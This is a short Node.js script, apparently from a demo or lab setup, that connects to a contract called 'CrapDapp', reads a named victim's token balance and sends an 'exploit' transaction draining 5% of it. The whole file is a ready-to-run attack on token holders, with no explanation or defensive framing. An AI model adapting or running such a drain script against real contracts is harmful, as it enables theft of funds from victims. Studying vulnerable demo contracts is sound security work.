'use strict'
const BigNumber = require('bignumber.js');
const FlexContract = require('flex-contract');
const DAPP_ABI = require('../../contracts/CrapDapp.abi.json');

const env = require('./env');

const DRAIN_PCT = 0.05;

(async () => {
    const dapp = new FlexContract(DAPP_ABI, { address: env.dapp, network: env.providerURI });
    const balance = await dapp.getVictimBalance(env.token, env.victim).call();
    const amount = new BigNumber(balance).times(DRAIN_PCT).integerValue();
    const receipt = await dapp.exploit(env.token, env.victim, amount).send();
    console.log(receipt);
})();
